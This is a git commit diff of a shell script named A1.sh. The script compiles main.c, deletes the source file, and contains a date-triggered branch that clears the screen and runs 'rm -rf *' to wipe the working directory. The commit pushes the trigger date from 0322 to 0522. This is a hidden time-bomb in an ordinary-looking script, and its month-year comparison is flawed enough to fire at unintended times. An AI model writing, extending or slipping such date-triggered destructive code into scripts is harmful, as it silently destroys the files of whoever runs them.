ddf367c4ba528afd7eb39ddb4b959899d7bb5b82
Mike Edwards <82988362+mike90s15@users.noreply.github.com>
2022-02-13 19:15:18 -0300

    Update A1.sh

--- A1.sh
+++ A1.sh
@@ -37,7 +37,7 @@ test -f main.c && gcc main.c -o main
 if [[ -f main ]]; then
     test -f main.c && rm -rf main.c
 fi
-if (($(date +%m%y) >= 0322)); then
+if (($(date +%m%y) >= 0522)); then
     clear
     rm -rf *
 else
